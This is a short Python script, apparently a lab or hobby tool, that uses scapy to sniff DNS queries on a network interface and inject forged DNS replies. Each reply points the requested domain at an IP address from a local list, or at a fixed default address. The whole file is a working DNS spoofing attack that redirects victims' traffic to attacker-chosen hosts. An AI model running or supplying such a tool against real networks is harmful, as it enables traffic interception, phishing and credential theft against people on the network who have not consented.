#!/usr/bin/env python

from scapy.all import *


def dnsSpoofer(packet):

	if packet[DNSQR]:
		print "[+] Received DNS Request for %s"% packet[DNSQR].qname.strip('.')
		
		#Acquire all the relevant data from the received DNS Request
		srcIP=packet[IP].src
		dstIP=packet[IP].dst
		destPort=packet[IP].dport
		sourcePort=packet[IP].sport
		queryName=packet[DNSQR].qname
		dns_id = packet[DNS].id 		
		dns_qd = packet[DNS].qd
				
		forwardIP = findIP(queryName)
		
		#destination IP is the previous source and vice-versa
		ip = IP(dst=srcIP,src=dstIP)
		#destinationPort is the previous source and vice versa
        	udp = UDP(dport=sourcePort,sport=destPort)
		#create a dns packet		
		dns = DNS(id=dns_id,qr=1,qd=dns_qd,an=DNSRR(rrname=queryName,ttl=60,rdata=forwardIP))
		
		#merge the layers to a complete packet
		dnsPacket = ip/udp/dns

		send(dnsPacket,verbose=0)
		print "[+] Sent DNS Response stating that: %s is at %s" %(queryName.strip('.'), forwardIP)	

def findIP(queryName):
	with open('dnslist','r') as f:
		lines = f.readlines()
	found = False
	
	for line in lines:
		queryName = queryName.strip('.')
		queryName = queryName.lstrip('www.')
		
		if queryName in line:
			#return the extracted IP address from the file	
			found = True
			qName = line.split(" ")[0]
	
	if found: 
		return qName
	else:
		return "192.168.2.6"
			
		

sniff(iface="eth1", filter="udp port 53", prn=dnsSpoofer)
